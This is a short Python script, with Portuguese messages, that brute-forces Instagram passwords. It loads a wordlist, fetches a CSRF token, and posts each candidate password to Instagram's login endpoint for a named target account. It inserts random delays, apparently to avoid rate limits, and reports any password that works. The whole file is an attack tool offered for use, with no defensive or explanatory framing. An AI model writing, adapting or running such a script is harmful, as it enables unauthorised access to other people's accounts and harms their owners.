import requests
from bs4 import BeautifulSoup
import time
import random

class InstagramBruteForce:
    def __init__(self, username, password_file):
        self.username = username
        self.password_file = password_file
        self.session = requests.Session()
        self.csrf_token = None
        
    def get_csrf_token(self):
        response = self.session.get("https://www.instagram.com/accounts/login/")
        soup = BeautifulSoup(response.text, 'html.parser')
        self.csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'}).get('value')
        
    def attempt_login(self, password):
        data = {
            'username': self.username,
            'password': password,
            'csrfmiddlewaretoken': self.csrf_token
        }
        
        response = self.session.post(
            "https://www.instagram.com/accounts/login/ajax/",
            data=data,
            headers={'X-CSRFToken': self.csrf_token}
        )
        
        return "authenticated" in response.text
    
    def run(self):
        self.get_csrf_token()
        with open(self.password_file, 'r') as f:
            passwords = [line.strip() for line in f]
            
        for password in passwords:
            if self.attempt_login(password):
                print(f"✅ Senha encontrada: {password}")
                return True
                
            # Adicionar delay aleatório
            time.sleep(random.uniform(1, 3))
            
        print("❌ Falha ao encontrar senha")
        return False

if __name__ == "__main__":
    brute_force = InstagramBruteForce("target_username", "passwords.txt")
    brute_force.run()
